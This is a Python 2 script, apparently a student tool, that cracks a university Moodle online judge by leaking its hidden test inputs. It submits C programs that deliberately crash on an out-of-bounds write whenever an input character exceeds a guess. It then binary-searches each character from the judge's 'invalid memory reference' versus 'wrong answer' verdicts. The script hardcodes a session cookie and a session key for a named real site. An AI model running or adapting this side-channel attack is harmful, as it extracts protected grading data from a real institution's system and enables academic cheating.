# -*- coding: utf-8 -*-
import httplib
import urllib
import time
####config
code='haozi'
cookie='u2gbee5nqgupu8pruimq8bt4o5'
_id='32229'
number=1
length=20

####config
class online_crack():
    response_data=''
    def __init__(self):
        pass
    
    def guess(self):
        string=''
        for i in range(0,length):
            self.binary_core(i,255,0)
            print '[:)]the %d char is:%s\n'%(i,self.char)
            string+=self.char
            print "[:)]the test instance now is:%s\n"%string
            
            
        
    def test(self):
         self.post_code(self.gen_code(1,128))
         self.get_result()
         a=self.read_result(number)
         print a


         
        
    def binary_core(self,offset,head,tail):
        
        ascii=(head+tail)/2
        self.post_code(self.gen_code(offset,ascii))
        self.get_result()
        a=self.read_result(number)
        while(a==-1):
            time.sleep(5)
            self.get_result()
            a=self.read_result(number)
        if(head-1==tail):
            self.char=chr(head)
            return 1
        elif(a==0):
            self.binary_core(offset,ascii,tail)
        elif(a==1):
            self.binary_core(offset,head,ascii)
            
        
        
    def http(self,method,host,port,url,data,headers):
        con=httplib.HTTPConnection(host,port,timeout=20)
        if method=='post' or method=='POST':
            headers['Content-Length']=len(data)
            con.request("POST",url,data,headers=headers)
        else:
            con.request("GET",url,headers=headers)
        return con.getresponse().read()
    
    def post_code(self,code):
        headers={'Content-Type': 'application/x-www-form-urlencoded',\
                'Cookie': 'MoodleSessionMOODLE=%s'%cookie,\
                'Host': 'online.bit.edu.cn'}
        print "[*]your payload is: \n"+code+'\n'
        code=urllib.urlencode({'code':code})
        data='id=%s&sesskey=b4MXCfgxuJ&_qf__submit_form=1&%s'%(_id,code)+\
          '&language=1&sourcefile=2'
        return self.http('post','online.bit.edu.cn',80,'/moodle/mod/programming/submit.php',data,headers)
    
    def gen_code(self,offset,ascii):
        code1='#include<stdio.h>\n#include <string.h>\nint main(int argc, char *argv[] ){int a[2];char str[9000];char tmp[300];'
        code2='return 0;}'
        code3='while(gets(tmp)){strcat(str,tmp);}'
        my_payload="if((int)str[%d]>%d){a[3]=1;}"%(offset,ascii)
        code=code1+code3+my_payload+code2
        return code
        
    
    def get_result(self):
        headers={'Cookie': 'MoodleSessionMOODLE=%s'%cookie,\
                'Host': 'online.bit.edu.cn'}
        self.response_data=self.http('get','online.bit.edu.cn',80,'/moodle/mod/programming/result.php?id=%s'%_id,'',headers)
    
    def read_result(self,number):
        match1='<td class="cell c0" style="">%d</td>'%number
        match2='<td class="cell c0" style="">%d</td>'%(number+1)
        p1=self.response_data.find(match1)
        p2=self.response_data.find(match2)
        if p1<0:
           pass
        if p2<0:
            match_data=self.response_data[p1:]
        else:
            match_data=self.response_data[p1:p2]
        #print match_data(debug)
        if '无效内存引用' in match_data:
            return 1
        elif '错误的结果' in match_data:
            return 0
        else:
            return -1
        
        
        
            
        
    
if __name__=='__main__':
    haozi=online_crack()
    print "[*]BIT online cracker for C"
    print "[*]Created by haozige@2016"
    _id=raw_input('[*]please input the id of your problems: ')
    number=int(raw_input('[*]please input the number of your the test instance: '))
    length=int(raw_input('[*]please input the length of the test instance input: '))
    print "[*]ok,let's start"
    haozi.guess()

    
    

